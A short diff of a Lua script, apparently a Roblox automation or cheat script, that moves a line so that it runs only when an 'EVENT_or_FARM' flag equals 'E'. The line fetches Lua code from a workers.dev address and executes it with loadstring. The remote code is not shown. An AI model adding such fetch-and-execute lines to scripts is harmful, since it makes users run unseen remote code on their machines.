@@ -45,7 +45,7 @@ if _Config_Offline ~= _Config_Online then
 		if rank < 30 and EVENT_or_FARM == "E" then
 			
 		end
-		loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.lua"))()
+		
 		--------------------------------------------
 end
 
@@ -53,5 +53,5 @@ if _G.Restart == true then
 	_G.Restart = false 	
 end
 		if EVENT_or_FARM == "E" then	
-			--
+			loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.lua"))()
 		end
